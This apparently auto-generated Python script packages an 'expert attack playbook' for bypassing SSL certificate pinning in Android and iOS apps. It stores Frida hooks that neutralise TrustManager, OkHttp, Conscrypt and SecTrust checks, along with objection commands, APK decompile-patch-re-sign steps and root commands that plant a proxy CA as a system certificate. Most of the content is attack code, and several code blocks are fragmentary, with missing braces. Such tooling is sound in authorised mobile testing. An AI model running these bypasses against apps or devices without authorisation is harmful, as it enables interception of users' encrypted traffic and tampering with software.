#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/mobile-ssl-pinning-bypass

Skill: SKILL: Mobile SSL Pinning Bypass — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-mobile-ssl-pinning-bypass.py --help
      python hack-skills-mobile-ssl-pinning-bypass.py --list
      python hack-skills-mobile-ssl-pinning-bypass.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/mobile-ssl-pinning-bypass'
TITLE = 'SKILL: Mobile SSL Pinning Bypass — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: mobile-ssl-pinning-bypass", "description: >-", "Mobile SSL pinning bypass playbook. Use when intercepting HTTPS traffic from mobile applications that implement certificate pinning, public key pinning, or SPKI hash pinning on Android and iOS, including React Native, Flutter, and Xamarin frameworks."],
    'skill-mobile-ssl-pinning-bypass-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [android-pentesting-tricks](../android-pentesting-tricks/SKILL.md) for broader Android testing beyond SSL bypass", "- [ios-pentesting-tricks](../ios-pentesting-tricks/SKILL.md) for broader iOS testing beyond SSL bypass", "- [api-sec](../api-sec/SKILL.md) once traffic is intercepted for API-level testing"],
    '1-ssl-pinning-types': [],
    'how-pinning-works': ["TLS Handshake", "\u251c\u2500\u2500 Server presents certificate chain", "\u251c\u2500\u2500 Standard validation (system trust store)", "\u2502   \u2514\u2500\u2500 Passes? continue : connection fails", "\u2514\u2500\u2500 Pin validation (app-level check)", "\u251c\u2500\u2500 Extract server cert/pubkey/SPKI hash", "\u251c\u2500\u2500 Compare against embedded pins", "\u2514\u2500\u2500 Match found? \u2192 allow : \u2192 reject connection"],
    '2-android-bypass-methods': [],
    '2-1-frida-universal-ssl-bypass': ["```javascript", "// Hooks TrustManager, OkHttp, Volley, Retrofit, Conscrypt", "Java.perform(function() {", "// \u2500\u2500 TrustManagerImpl (Android system) \u2500\u2500", "try {", "var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');", "TMI.verifyChain.implementation = function() {", "console.log('[Bypass] TrustManagerImpl.verifyChain');", "return arguments[0]; // return untouched chain", "} catch(e) {}", "// \u2500\u2500 X509TrustManager (custom implementations) \u2500\u2500", "var TrustManager = Java.registerClass({", "name: 'com.bypass.TrustManager',", "implements: [Java.use('javax.net.ssl.X509TrustManager')],", "methods: {", "checkClientTrusted: function() {},", "checkServerTrusted: function() {},", "getAcceptedIssuers: function() { return []; }", "var SSLContext = Java.use('javax.net.ssl.SSLContext');", "SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;',", "'[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')", ".implementation = function(km, tm, sr) {", "console.log('[Bypass] SSLContext.init');", "this.init(km, [TrustManager.$new()], sr);", "// \u2500\u2500 OkHttp3 CertificatePinner \u2500\u2500", "try {", "var CP = Java.use('okhttp3.CertificatePinner');", "CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {", "console.log('[Bypass] OkHttp3 CertificatePinner.check: ' + arguments[0]);", "// check$okhttp variant (OkHttp 4.x)", "try { CP['check$okhttp'].implementation = function() {}; } catch(e) {}", "} catch(e) {}", "// \u2500\u2500 Retrofit / OkHttp interceptor \u2500\u2500", "try {", "var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');", "OkHttpClient.certificatePinner.implementation = function(pinner) {", "console.log('[Bypass] OkHttpClient.Builder.certificatePinner');", "return this; // return builder without pinner", "} catch(e) {}", "// \u2500\u2500 Volley (HurlStack) \u2500\u2500", "try {", "var HurlStack = Java.use('com.android.volley.toolbox.HurlStack');", "HurlStack.createConnection.implementation = function(url) {", "console.log('[Bypass] Volley HurlStack: ' + url);", "var conn = this.createConnection(url);", "// Remove hostname verifier", "conn.setHostnameVerifier(Java.use(", "'javax.net.ssl.HttpsURLConnection').getDefaultHostnameVerifier());", "return conn;", "} catch(e) {}", "// \u2500\u2500 Conscrypt / BoringSSL (modern Android) \u2500\u2500", "try {", "var Conscrypt = Java.use('org.conscrypt.ConscryptFileDescriptorSocket');", "Conscrypt.verifyCertificateChain.implementation = function() {", "console.log('[Bypass] Conscrypt verifyCertificateChain');", "} catch(e) {}", "// \u2500\u2500 Apache HttpClient (legacy) \u2500\u2500", "try {", "var AbstractVerifier = Java.use('org.apache.http.conn.ssl.AbstractVerifier');", "AbstractVerifier.verify.overload('java.lang.String', '[Ljava.lang.String;',", "'[Ljava.lang.String;', 'boolean').implementation = function() {", "console.log('[Bypass] Apache AbstractVerifier');", "} catch(e) {}", "// \u2500\u2500 HostnameVerifier \u2500\u2500", "try {", "var HV = Java.use('javax.net.ssl.HttpsURLConnection');", "HV.setDefaultHostnameVerifier.implementation = function(v) {", "console.log('[Bypass] Ignoring custom HostnameVerifier');", "} catch(e) {}", "console.log('[+] Android universal SSL bypass loaded');"],
    '2-2-objection-one-command': ["```bash", "objection -g com.target.app explore --startup-command \"android sslpinning disable\""],
    '2-3-network-security-config-debug-override': ["```xml", "<!-- AndroidManifest.xml: android:networkSecurityConfig=\"@xml/network_security_config\" -->", "<!-- res/xml/network_security_config.xml -->", "<network-security-config>", "<base-config>", "<trust-anchors>", "<certificates src=\"system\" />", "<certificates src=\"user\" />     <!-- Trust user-installed CAs -->", "</trust-anchors>", "</base-config>", "</network-security-config>", "Workflow: decompile APK \u2192 add/modify config \u2192 repackage \u2192 re-sign \u2192 install.", "```bash", "apktool d target.apk -o target_dir"],
    'edit-res-xml-network-security-config-xml': [],
    'add-reference-in-androidmanifest-xml-if-missing': ["apktool b target_dir -o target_patched.apk", "zipalign -v 4 target_patched.apk target_aligned.apk", "apksigner sign --ks my-key.keystore target_aligned.apk", "adb install target_aligned.apk"],
    '2-4-xposed-lsposed-modules': [],
    '2-5-magisk-system-ca-installation': ["```bash"],
    'install-proxy-ca-as-system-cert-android-7-requires-this-for-system-level-trust': [],
    'method-1-magisktrustusercerts-module': [],
    'moves-user-cas-to-system-etc-security-cacerts-via-magisk-overlay': [],
    'method-2-manual-requires-root': ["adb push burp_ca.pem /sdcard/", "adb shell", "mount -o remount,rw /system", "cp /sdcard/burp_ca.pem /system/etc/security/cacerts/9a5ba575.0  # hash-named", "chmod 644 /system/etc/security/cacerts/9a5ba575.0", "mount -o remount,ro /system"],
    'get-correct-hash-filename': ["openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1"],
    'output-9a5ba575-filename-is-9a5ba575-0': [],
    '2-6-manual-decompile-patch-repackage': ["```bash"],
    'step-1-decompile': ["jadx -d decompiled/ target.apk"],
    'step-2-find-pinning-code': ["grep -r \"CertificatePinner\\|X509TrustManager\\|checkServerTrusted\\|ssl\" decompiled/"],
    'step-3-identify-pinning-implementation-and-patch': [],
    'use-smali-editing-for-precise-control': ["apktool d target.apk"],
    'edit-smali-files-to-nop-out-pinning-checks': [],
    'look-for-invoke-virtual-checkservertrusted-and-replace-with-return-void': [],
    'step-4-repackage-and-sign': ["apktool b target_dir -o patched.apk", "apksigner sign --ks debug.keystore patched.apk"],
    '3-ios-bypass-methods': [],
    '3-1-frida-sectrust-hooks': ["```javascript", "// Hook core iOS SSL validation functions", "var SecTrustEvaluateWithError = Module.findExportByName('Security', 'SecTrustEvaluateWithError');", "Interceptor.attach(SecTrustEvaluateWithError, {", "onLeave: function(retval) {", "retval.replace(ptr(1));", "var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');", "Interceptor.attach(SecTrustEvaluate, {", "onLeave: function(retval) {", "retval.replace(ptr(0));", "// Hook SSLHandshake (lower-level)", "var SSLHandshake = Module.findExportByName('Security', 'SSLHandshake');", "if (SSLHandshake) {", "Interceptor.attach(SSLHandshake, {", "onLeave: function(retval) {", "if (retval.toInt32() === -9807) { // errSSLXCertChainInvalid", "retval.replace(ptr(0));", "// Hook NSURLSession delegate method", "try {", "var cls = ObjC.classes.NSURLSession;", "// Hook URLSession:didReceiveChallenge:completionHandler: on delegates", "ObjC.enumerateLoadedClasses({", "onMatch: function(name) {", "try {", "var methods = ObjC.classes[name].$ownMethods;", "for (var i = 0; i < methods.length; i++) {", "if (methods[i].indexOf('didReceiveChallenge') !== -1 &&", "methods[i].indexOf('completionHandler') !== -1) {", "console.log('[SSL] Found delegate: ' + name + ' ' + methods[i]);", "} catch(e) {}", "onComplete: function() {}", "} catch(e) {}"],
    '3-2-objection-one-command': ["```bash", "objection -g com.target.app explore --startup-command \"ios sslpinning disable\""],
    '3-3-ssl-kill-switch-2-jailbreak-tweak': ["```bash"],
    'install-via-cydia-sileo': [],
    'package-com-nablac0d3-sslkillswitch2': [],
    'disables-ssl-pinning-system-wide-or-per-app-via-settings-toggle': [],
    'hooks': [],
    'sectrustevaluate': [],
    'sslhandshake': [],
    'sslsetsessionoption': [],
    'tls-helper-create-peer-trust': [],
    '3-4-library-specific-hooks': [],
    '3-5-manual-binary-patch': ["```bash"],
    'find-pinning-function-in-binary': ["strings decrypted_binary | grep -i \"pin\\|cert\\|trust\""],
    'disassemble-and-find-the-validation-function': [],
    'replace-comparison-branch-instruction-with-nop-or-unconditional-pass': [],
    'lldb-runtime-modification': ["lldb -n TargetApp", "(lldb) breakpoint set -n \"SecTrustEvaluateWithError\"", "(lldb) breakpoint command add 1"],
    '4-framework-specific-bypasses': [],
    '4-1-flutter': ["Flutter uses Dart's `dart:io` library with BoringSSL underneath. Standard Frida hooks on Java/ObjC layers don't work.", "```javascript", "// Flutter SSL bypass \u2014 must hook BoringSSL directly", "// Find ssl_crypto_x509_session_verify_cert_chain in libflutter.so", "var libflutter = Process.findModuleByName('libflutter.so');  // Android", "// var libflutter = Process.findModuleByName('Flutter');       // iOS", "// Hook ssl_verify_peer_cert (BoringSSL function)", "// Signature varies by Flutter version \u2014 use pattern scanning", "var pattern = 'FF C3 ..';  // Example pattern, varies", "var matches = Memory.scan(libflutter.base, libflutter.size, pattern, {", "onMatch: function(address, size) {", "console.log('[Flutter] Potential verify function at: ' + address);", "Interceptor.attach(address, {", "onLeave: function(retval) {", "retval.replace(ptr(0));  // SSL_VERIFY_OK", "onComplete: function() {}", "// Alternative: use reflutter tool for automated patching", "// reflutter target.apk", "// This patches BoringSSL in the Flutter engine directly", "**reflutter tool** (recommended for Flutter apps):", "```bash", "pip install reflutter", "reflutter target.apk"],
    'outputs-patched-apk-that-redirects-traffic-to-your-proxy': [],
    'also-disables-ssl-verification-in-the-boringssl-engine': [],
    '4-2-react-native': ["React Native uses platform networking: OkHttp on Android, NSURLSession on iOS.", "```javascript", "// React Native Android \u2014 same as OkHttp bypass", "Java.perform(function() {", "try {", "var CP = Java.use('okhttp3.CertificatePinner');", "CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {};", "} catch(e) { console.log('OkHttp3 not found, trying okhttp2...'); }", "try {", "var CP2 = Java.use('com.squareup.okhttp.CertificatePinner');", "CP2.check.overload('java.lang.String', 'java.util.List').implementation = function() {};", "} catch(e) {}"],
    '4-3-xamarin': ["```csharp", "// Xamarin pinning typically via:", "// ServicePointManager.ServerCertificateValidationCallback", "// or custom HttpClientHandler", "```javascript", "// Frida bypass for Xamarin (Mono runtime)", "// Hook Mono method: System.Net.ServicePointManager.set_ServerCertificateValidationCallback", "var mono_method = Module.findExportByName('libmonosgen-2.0.so',", "'mono_runtime_invoke');", "// More practical: hook the managed callback at CIL level", "// Use Frida's Mono bridge or objection's built-in Xamarin support", "// Objection has built-in Xamarin bypass:", "// objection -g com.target.app explore", "// > android sslpinning disable   (covers Xamarin on Android)"],
    '5-certificate-transparency-hpkp': [],
    '6-troubleshooting': [],
    '6-1-common-failures': [],
    '6-2-diagnostic-steps': ["```bash"],
    'verify-proxy-ca-is-installed-correctly': [],
    'android': ["adb shell \"ls /system/etc/security/cacerts/ | grep $(openssl x509 -subject_hash_old -in ca.pem | head -1)\""],
    'ios-settings-general-about-certificate-trust-settings': [],
    'check-if-target-app-is-actually-using-ssl-vs-plain-http': [],
    'wireshark-filter-tcp-port-443-and-ip-addr-device-ip': [],
    'check-if-frida-is-hooking-the-right-process': ["frida-ps -U | grep target"],
    'verbose-frida-output-for-debugging-hooks': ["frida -U -f com.target.app -l bypass.js --debug"],
    '7-ssl-pinning-bypass-decision-tree': ["Need to intercept mobile app HTTPS traffic", "\u251c\u2500\u2500 Platform?", "\u2502   \u251c\u2500\u2500 Android \u2193", "\u2502   \u2502   \u251c\u2500\u2500 Rooted device available?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Yes \u2192 Frida universal bypass (\u00a72.1) [FIRST TRY]", "\u2502   \u2502   \u2502   \u2502   \u251c\u2500\u2500 Works? \u2192 done", "\u2502   \u2502   \u2502   \u2502   \u2514\u2500\u2500 Fails? \u2192 add Conscrypt + Volley hooks", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Still fails? \u2192 LSPosed + TrustMeAlready (\u00a72.4)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Still fails? \u2192 install CA as system cert (\u00a72.5)", "\u2502   \u2502   \u2514\u2500\u2500 No root?", "\u2502   \u2502       \u251c\u2500\u2500 Debug build? \u2192 Network Security Config (\u00a72.3)", "\u2502   \u2502       \u2514\u2500\u2500 Release build? \u2192 decompile + patch + repackage (\u00a72.6)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 iOS \u2193", "\u2502       \u251c\u2500\u2500 Jailbroken device available?", "\u2502       \u2502   \u251c\u2500\u2500 Yes \u2192 Objection ios sslpinning disable (\u00a73.2) [FIRST TRY]", "\u2502       \u2502   \u2502   \u251c\u2500\u2500 Works? \u2192 done", "\u2502       \u2502   \u2502   \u2514\u2500\u2500 Fails? \u2192 Frida SecTrust hooks (\u00a73.1)", "\u2502       \u2502   \u251c\u2500\u2500 Still fails? \u2192 SSL Kill Switch 2 (\u00a73.3)", "\u2502       \u2502   \u2514\u2500\u2500 Still fails? \u2192 library-specific hooks (\u00a73.4)", "\u2502       \u2514\u2500\u2500 No jailbreak?", "\u2502           \u251c\u2500\u2500 Re-sign with Frida gadget \u2192 run Frida hooks", "\u2502           \u2514\u2500\u2500 Binary patch \u2192 sideload (\u00a73.5)", "\u251c\u2500\u2500 Framework-specific app?", "\u2502   \u251c\u2500\u2500 Flutter \u2192 reflutter tool or BoringSSL native hooks (\u00a74.1)", "\u2502   \u251c\u2500\u2500 React Native \u2192 standard platform hooks (\u00a74.2)", "\u2502   \u2514\u2500\u2500 Xamarin \u2192 Objection or Mono runtime hooks (\u00a74.3)", "\u251c\u2500\u2500 Bypass works but issues remain?", "\u2502   \u251c\u2500\u2500 Client cert required? \u2192 extract + import to proxy (\u00a76.1)", "\u2502   \u251c\u2500\u2500 Non-HTTP protocol? \u2192 protocol-specific tooling (\u00a76.1)", "\u2502   \u2514\u2500\u2500 App crashes? \u2192 fix anti-tampering first (\u00a76.1)", "\u2514\u2500\u2500 All methods fail?", "\u251c\u2500\u2500 Analyze traffic at network level (Wireshark/tcpdump)", "\u251c\u2500\u2500 Check for custom proprietary protocol", "\u2514\u2500\u2500 Consider iptables + transparent proxy approach"],
    '8-proxy-setup-quick-reference': ["```bash"],
    'android-proxy-setup': ["adb shell settings put global http_proxy <host_ip>:8080"],
    'remove-proxy': ["adb shell settings put global http_proxy :0"],
    'ios-proxy-settings-wi-fi-configure-proxy-manual': [],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()